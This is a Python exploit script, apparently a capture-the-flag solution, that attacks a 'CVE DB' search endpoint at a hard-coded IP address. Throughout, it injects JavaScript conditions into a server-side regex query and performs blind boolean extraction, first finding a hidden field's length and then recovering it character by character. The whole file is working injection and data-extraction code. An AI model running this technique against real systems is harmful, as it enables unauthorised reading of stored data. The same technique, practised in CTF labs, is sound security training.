#!/usr/bin/env python3
"""CVE DB - Flag extraction via JavaScript injection in regex literal"""

import requests
import re
import string
import sys

URL = "http://52.59.124.14:5000/search"

def test_query(query):
    """Send query and return number of results or error"""
    r = requests.post(URL, data={"query": query}, timeout=10)
    if "database error" in r.text:
        return "ERROR"
    if "Found" in r.text:
        m = re.search(r'Found (\d+) results?', r.text)
        return int(m.group(1)) if m else -1
    if 'class="no-results">' in r.text:
        return 0
    return "UNKNOWN"

def inject(condition):
    """Inject a JavaScript condition. Returns 1 if true, 0 if false."""
    query = f"1337/i) && {condition} && (/1337"
    return test_query(query)

# First find length of product field
print("=== Finding flag length ===")
for length in range(10, 100):
    r = inject(f"this.product.length === {length}")
    if r == 1:
        print(f"  Flag length: {length}")
        flag_len = length
        break
    if length % 10 == 0:
        print(f"  Checking length {length}...")
else:
    # Binary search for length
    print("  Trying binary search...")
    lo, hi = 1, 200
    while lo < hi:
        mid = (lo + hi) // 2
        r = inject(f"this.product.length > {mid}")
        if r == 1:
            lo = mid + 1
        else:
            hi = mid
    flag_len = lo
    print(f"  Flag length: {flag_len}")

# Extract flag character by character
print(f"\n=== Extracting flag ({flag_len} chars) ===")
charset = string.ascii_letters + string.digits + "_{}-!@#$%^&*()+=,./;:<>?"
flag = ""

for i in range(flag_len):
    found = False
    for c in charset:
        # Escape single quotes for JS
        if c == "'":
            js_char = "\\'"
        elif c == "\\":
            js_char = "\\\\"
        else:
            js_char = c

        r = inject(f"this.product.charCodeAt({i}) === {ord(c)}")
        if r == 1:
            flag += c
            found = True
            sys.stdout.write(c)
            sys.stdout.flush()
            break

    if not found:
        flag += "?"
        sys.stdout.write("?")
        sys.stdout.flush()

print(f"\n\nFLAG: {flag}")
